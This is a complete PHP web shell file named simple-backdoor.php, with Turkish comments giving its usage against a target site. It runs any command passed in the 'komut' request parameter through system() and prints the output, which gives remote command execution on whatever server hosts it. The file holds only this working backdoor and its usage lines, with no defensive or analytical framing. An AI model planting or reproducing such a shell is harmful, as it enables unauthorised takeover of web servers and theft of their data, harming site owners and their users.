<?php
if(isset($_REQUEST['komut'])){echo "<pre>";$komut = ($_REQUEST['komut']);system($komut);echo "</pre>";die;}
?>

<!-- Kullanımı: hedefsite.com/simple-backdoor.php?komut= cmdAdi+dizin -->
<!-- Kullanımı: hedefsite.com/simple-backdoor.php?komut= cmdAdi -->

